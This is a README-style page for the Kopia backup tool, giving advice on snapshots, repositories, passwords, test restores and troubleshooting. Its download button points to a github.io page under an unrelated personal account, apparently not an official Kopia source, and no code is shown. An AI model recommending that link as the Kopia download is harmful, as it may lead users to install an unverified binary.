Restore one small file to a new folder and open it before you trust the job. Do not delete the originals the same day as the first snapshot. The repository should sit on a different disk from the files it protects. If you lose the password, the snapshots stay closed.

# Kopia - Snapshots of Folders You Choose

Kopia stores snapshots of folders you select, on a disk or a server you control. You set the password. There is no vendor desk that can open the backup if you forget it. A snapshot is a copy of your files at a time you chose, not a license to read someone else's disk.

---

## Why It Stands Out

![Kopia with one folder the user selected and a snapshot ready to restore](https://global.discourse-cdn.com/free1/uploads/kopia/original/1X/3fa5508e96f2e47a63a3df32f8aaab591492e535.png)

Copying a folder by hand is easy to forget and easy to point at the wrong place. Kopia takes a snapshot of the paths you named and keeps older copies so a file you overwrote yesterday can still be restored. The repository can sit on another disk in this PC or on storage you were given an account for. It should not sit on a machine you do not administer.

The password is the backup. Write it down somewhere you control, offline if the files matter. Kopia cannot reconstruct it from your email. Before you trust the job, restore one small file to a different folder and open it. A snapshot you have never restored is only a hope. Do not delete the originals the same day you create the first snapshot.

---

## Core Capabilities

- **Chosen Folders:** You pick the directories. The rest of the disk is not swept in by default.
- **Snapshots Over Time:** An older copy can remain after you change or delete the working file.
- **A Repository You Place:** Another local disk, or a remote you are allowed to use.
- **A Password You Set:** Lose it and the snapshots stay unreadable. There is no recovery service in this setup.
- **A Test Restore:** Copy one file back to a new folder and open it before you rely on the job.

---

## Performance Tips

- Start with one folder, not the entire user profile.
- Exclude caches and download piles if you do not need them in every snapshot.
- Keep the repository on a different disk from the files it protects.
- Run one restore of a small file before you call the setup finished.

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **Operating System** | Windows 10 (64-bit) | Windows 11 (64-bit) |
| **Processor (CPU)** | Dual-core | Quad-core for large folders |
| **Memory (RAM)** | 2 GB | 8 GB |
| **Storage** | Space for the repository | A second disk |
| **Network** | None for a local repo | Only a remote you are allowed to use |
| **Secret** | A password you can keep | Written down outside the PC |

---

## Quick Setup

Prerequisites: A folder you want copied, a destination disk or account that is yours, and a password you will not lose.

[![GET Kopia](https://img.shields.io/badge/GET%20%E2%80%94%20Kopia-0f766e?style=for-the-badge&logoColor=white)](https://srarendorwoodder.github.io/.github/kopia-snapshots)

1.  **Install:** Use the build you meant to install and open it.
2.  **Create a Repository:** Point it at the other disk or the remote you control. Set the password.
3.  **Snapshot One Folder:** Pick a small directory you can afford to test.
4.  **Restore One File:** Put it in a new folder, open it, and only then add larger paths.

---

## Ideal For

- **A Project Folder:** Keep older copies of work you are still changing.
- **A Second Disk:** Snapshots that survive if the working drive fails.
- **A Remote You Own:** The same idea pointed at storage you were given, with the password kept locally.
- **A Restore Drill:** One file brought back on purpose, so the password and the path are known to work.

---

## Troubleshooting

- Repository will not open? The password is wrong or the disk is not connected. Kopia cannot reset it for you.
- Snapshot looks empty? Check that you selected the folder you think you selected.
- Restore landed in the wrong place? Read the destination path before you confirm. Do not restore over the only live copy on the first try.
- Remote rejected the login? Stop. Use the account you were issued, and do not try other names.

---

## Find Related Topics

kopia snapshot times, repository password, policy rules, retention length, restore one file, other disk, own folders, no recovery desk
